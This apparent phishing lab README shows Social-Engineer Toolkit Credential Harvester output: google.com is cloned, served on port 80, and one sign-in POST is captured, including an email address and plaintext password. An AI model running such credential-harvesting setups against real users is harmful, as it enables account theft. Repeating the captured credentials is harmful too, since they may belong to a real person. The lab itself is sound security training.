# DIO_Phishing

[*] Cloning the website: http://www.google.com                                                  
[*] This could take a little bit...                                                             

The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.                                                        
[*] The Social-Engineer Toolkit Credential Harvester Attack
[*] Credential Harvester is running on port 80                                                  
[*] Information will be displayed to you as it arrives below:                                   
10.0.0.8 - - [21/Feb/2023 20:29:27] "GET / HTTP/1.1" 200 -
10.0.0.8 - - [21/Feb/2023 20:29:29] "GET /favicon.ico HTTP/1.1" 404 -
[*] WE GOT A HIT! Printing the output:
PARAM: GALX=SJLCkfgaqoM                                                                         
PARAM: continue=https://accounts.google.com/o/oauth2/auth?zt=ChRsWFBwd2JmV1hIcDhtUFdldzBENhIfVWsxSTdNLW9MdThibW1TMFQzVUZFc1BBaURuWmlRSQ%E2%88%99APsBz4gAAAAAUy4_qD7Hbfz38w8kxnaNouLcRiD3YTjX    
PARAM: service=lso                                                                              
PARAM: dsh=-7381887106725792428                                                                 
PARAM: _utf8=â                                                                                  
PARAM: bgresponse=js_disabled                                                                   
PARAM: pstMsg=1                                                                                 
PARAM: dnConn=                                                                                  
PARAM: checkConnection=                                                                         
PARAM: checkedDomains=youtube                                                                   
POSSIBLE USERNAME FIELD FOUND: Email=rafagarrafinha2009@gmail.com                               
POSSIBLE PASSWORD FIELD FOUND: Passwd=garrafadeplastico                                                          
PARAM: signIn=Sign+in                                                                           
PARAM: PersistentCookie=yes                                                                     
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.      
